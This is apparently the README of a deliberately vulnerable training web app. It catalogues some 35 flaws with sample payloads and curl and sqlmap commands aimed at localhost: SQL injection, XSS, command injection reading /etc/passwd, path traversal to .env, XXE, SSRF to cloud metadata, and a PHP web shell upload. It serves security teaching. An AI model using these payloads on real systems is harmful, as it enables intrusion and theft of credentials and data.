# Enhanced Vulnerable Application - 30 Vulnerabilities

An even more vulnerable web application with 30 different security flaws for educational purposes.

**⚠️ WARNING**: This application is **intentionally extremely vulnerable**. Use only for learning and authorized testing.

---

## All 30 Vulnerabilities

### OWASP Top 10 (Original)

| # | Vulnerability | Endpoint | Attack Vector |
|---|---|---|---|
| 1 | SQL Injection | `/login` | `' OR '1'='1' --` |
| 2 | Cross-Site Scripting (XSS) | `/comment` | `<script>alert('XSS')</script>` |
| 3 | Insecure Direct Object References (IDOR) | `/user/:id` | `/user/2` |
| 4 | Cross-Site Request Forgery (CSRF) | `/transfer-money` | No token validation |
| 5 | Broken Authentication | `/admin` | No login required |
| 6 | Security Misconfiguration | `/config`, `/debug` | Exposed files |
| 7 | Sensitive Data Exposure | All endpoints | HTTP, plaintext |
| 8 | Missing Access Controls | Multiple | No authorization |
| 9 | Using Vulnerable Components | `package.json` | Old dependencies |
| 10 | Insufficient Logging | `app.log` | Log injection |

### Additional Top Vulnerabilities

| # | Vulnerability | Endpoint | Attack Vector |
|---|---|---|---|
| 11 | Command Injection | `/ping` | `; whoami` |
| 12 | Path Traversal | `/download` | `../app.js` |
| 13 | Hardcoded Credentials | `/api-key` | Direct exposure |
| 14 | Weak Password Storage | `/register`, `/user/1` | Plaintext |
| 15 | Information Disclosure | `/debug` | Debug endpoint |
| 16 | Open Redirect | `/redirect` | Any URL |
| 17 | XXE Injection | `/parse-xml` | XML parsing |
| 18 | SSRF | `/fetch-url` | Internal access |
| 19 | Mass Assignment | `/update-profile` | Over-posting |
| 20 | Weak Encryption | `/encrypt` | ECB mode |

### Advanced Vulnerabilities

| # | Vulnerability | Endpoint | Attack |
|---|---|---|---|
| 21 | Uncontrolled Recursion/DOS | `/process-json` | Deep nesting |
| 22 | Insecure Password Reset | `/reset-password?token=1` | Predictable tokens |
| 23 | HTTP Parameter Pollution | `/process?id=1&id=2` | Duplicate parameters |
| 24 | Missing Input Validation | `/create-post` | No length/type checks |
| 25 | Log Injection | `/search?q=` | Newline injection |
| 26 | No Rate Limiting | `/brute-force-login` | Unlimited attempts |
| 27 | Public Config Exposure | `/config` | File download |
| 28 | No HTTPS | All endpoints | Man-in-the-middle |
| 29 | Vulnerable Dependencies | `npm audit` | Known CVEs |
| 30 | Unsafe Redirects | `/open-link` | javascript: protocol |

### Bonus Vulnerabilities

| # | Vulnerability | Endpoint | Attack |
|---|---|---|---|
| 31 | Timing Attacks | `/timing-attack` | Time-based comparison |
| 32 | JSON Serialization | `/userdata?id=1, "isAdmin": true}` | Injection |
| 33 | Insecure Temp Files | `/download-temp` | Predictable names |
| 34 | Insecure Session IDs | `/login-session` | Sequential IDs |
| 35 | No Security Headers | All endpoints | Missing CSP, HSTS, etc. |

---

## Vulnerability Details

### 1. SQL Injection
```
POST /login
username=' OR '1'='1' --
password=anything
Response: Bypass authentication
```

### 2. XSS (Reflected)
```
POST /comment
comment=<script>alert('XSS')</script>
Response: JavaScript executes
```

### 3. IDOR
```
GET /user/1
GET /user/2
Response: Access any user's data including password
```

### 4. Command Injection
```
GET /ping?host=127.0.0.1; whoami
GET /ping?host=localhost | cat /etc/passwd
Response: Execute arbitrary commands
```

### 5. Path Traversal
```
GET /download?file=../app.js
GET /download?file=../../../../etc/passwd
GET /download?file=../../.env
Response: Download any file
```

### 6. Missing Authentication
```
GET /admin
POST /admin/update
Response: Access admin panel without login
```

### 7. Hardcoded Credentials
```
GET /api-key
Response: Expose API keys and passwords
```

### 8. Weak Password Storage
```
GET /user/1
Response: See password in plaintext
```

### 9. Information Disclosure
```
GET /debug
Response: Database names, usernames, system info
```

### 10. Open Redirect
```
GET /redirect?url=https://attacker.com
Response: Redirect to malicious site (phishing)
```

### 11. CSRF (Cross-Site Request Forgery)
```
POST /transfer-money (no CSRF token)
amount=1000
recipient=attacker@evil.com
Response: Transfer money without user confirmation
```

### 12. File Upload Validation
```
POST /upload
filename=shell.php
content=<?php system($_GET['cmd']); ?>
Response: Upload executable file
```

### 13. Insecure Session IDs
```
POST /login-session
username=admin
Response: Session ID = 1 (predictable!)
```

### 14. XXE (XML External Entity)
```
POST /parse-xml
xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
Response: Read server files
```

### 15. SSRF (Server-Side Request Forgery)
```
GET /fetch-url?url=http://169.254.169.254/latest/meta-data/
Response: Access internal AWS metadata, Docker API, etc.
```

### 16. Mass Assignment / Over-posting
```
POST /update-profile
user_id=1
username=newname
isAdmin=1
isStaff=1
Response: Privilege escalation
```

### 17. Weak Encryption
```
POST /encrypt
data=hello
POST /encrypt (same input)
Response: Same ciphertext (ECB mode vulnerability)
```

### 18. Uncontrolled Recursion / DOS
```
POST /process-json (deeply nested JSON)
Response: Stack overflow / Server crash
```

### 19. Insecure Password Reset
```
GET /reset-password?token=1
GET /reset-password?token=2
Response: Reset any user's password
```

### 20. HTTP Parameter Pollution
```
GET /process?id=1&id=2
Response: Behavior depends on server (inconsistent handling)
```

### 21. Missing Input Validation
```
POST /create-post
title=<very long input causing buffer overflow>
Response: DOS or crash
```

### 22. Log Injection
```
GET /search?q=test%0A[FAKE] Admin logged in
Response: Forged log entries
```

### 23. No Rate Limiting
```
Rapid POST requests to /brute-force-login
Response: Unlimited login attempts (brute force attack)
```

### 24. Config File Exposure
```
GET /config
Response: Download .env file with all secrets
```

### 25. No HTTPS
```
All HTTP traffic in plaintext
Response: Man-in-the-middle attacks possible
```

### 26. Vulnerable Dependencies
```
npm audit
Response: Shows many known CVEs in dependencies
```

### 27. Unsafe Redirects
```
GET /open-link?link=javascript:alert('XSS')
GET /open-link?link=data:text/html,alert('XSS')
Response: Execute JavaScript from URL
```

### 28. Timing Attacks
```
POST /timing-attack
secret=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Response: Time difference reveals information
```

### 29. JSON Serialization Injection
```
GET /userdata?id=1, "isAdmin": true}//
Response: Invalid JSON but demonstrates serialization issues
```

### 30. Insecure Temporary Files
```
GET /download-temp (multiple times)
Response: Predictable temp file names
```

---

## Testing Quick Reference

### SQL Injection
```bash
curl -X POST -d "username=' OR '1'='1' --&password=x" http://localhost:3000/login
```

### XSS
```bash
curl -X POST -d "comment=<script>alert('XSS')</script>" http://localhost:3000/comment
```

### IDOR
```bash
curl http://localhost:3000/user/1
curl http://localhost:3000/user/2
```

### Command Injection
```bash
curl "http://localhost:3000/ping?host=8.8.8.8; whoami"
```

### Path Traversal
```bash
curl "http://localhost:3000/download?file=../app.js" > app.js
```

### CSRF
```bash
curl -X POST -d "amount=1000&recipient=attacker" http://localhost:3000/transfer-money
```

### SSRF
```bash
curl "http://localhost:3000/fetch-url?url=http://localhost:3000/admin"
```

---

## Directory Structure

```
Vulnerable Application/
├── app.js                      # 35 vulnerable endpoints
├── package.json               # Outdated dependencies
├── vulnerable.db              # SQLite with test data
├── app.log                    # Log injection demo
├── files/
│   └── sample.txt            # Path traversal test
├── uploads/                   # File upload destination
├── temp/                      # Insecure temp files
├── .env.example              # Hardcoded credentials template
├── README.md                 # Overview
├── QUICK_START.md            # Get running
├── TESTING_GUIDE.md          # Detailed testing
├── SECURE_FIXES.md           # How to fix
└── ENHANCED_VULNS.md         # This file
```

---

## Security Headers NOT Implemented

```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000
```

---

## Running the Application

```bash
npm install
npm start
# Visit http://localhost:3000
```

---

## Testing Tools

### Burp Suite Community Edition
```
1. Configure proxy (127.0.0.1:8080)
2. Browse to http://localhost:3000
3. Use Repeater to modify requests
4. Use Scanner for automated testing
```

### OWASP ZAP
```
1. Start ZAP
2. Set browser proxy
3. Browse application
4. Run active scanner
```

### SQLMap
```bash
sqlmap -u "http://localhost:3000/login" --data="username=test&password=test" -p username --dbs
```

### curl
```bash
# SQL Injection
curl -X POST -d "username=' OR '1'='1' --&password=x" http://localhost:3000/login

# XSS
curl -X POST -d "comment=<img src=x onerror=alert('XSS')>" http://localhost:3000/comment

# IDOR
curl http://localhost:3000/user/1

# Command Injection
curl "http://localhost:3000/ping?host=127.0.0.1; id"

# Path Traversal
curl "http://localhost:3000/download?file=../package.json"

# SSRF
curl "http://localhost:3000/fetch-url?url=http://localhost:3000"
```

---

## Learning Path

1. **Week 1: OWASP Top 10**
   - SQL Injection → Parameterized queries
   - XSS → Output encoding
   - Authentication → Proper session management
   - CSRF → CSRF tokens

2. **Week 2: Advanced Topics**
   - SSRF → URL validation
   - XXE → DTD validation
   - Deserialization → Input validation
   - Mass Assignment → Whitelist fields

3. **Week 3: Security Hardening**
   - HTTPS/TLS → Certificates
   - Security Headers → CSP, HSTS
   - Authentication → OAuth, JWT
   - Encryption → AES-GCM

---

## Key Takeaways

- **Input Validation**: Never trust user input
- **Output Encoding**: Always escape output
- **Parameterized Queries**: Prevent SQL injection
- **Authentication**: Verify user identity
- **Authorization**: Check user permissions
- **Encryption**: Use strong algorithms
- **Logging**: Sanitize log input
- **Security Headers**: Implement CSP, HSTS, etc.
- **HTTPS**: Always use TLS
- **Dependencies**: Keep packages updated

---

## Disclaimer

This application is for **educational purposes only**. Using it on systems you don't own without authorization is illegal. Always obtain written permission before security testing.

---

## Resources

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
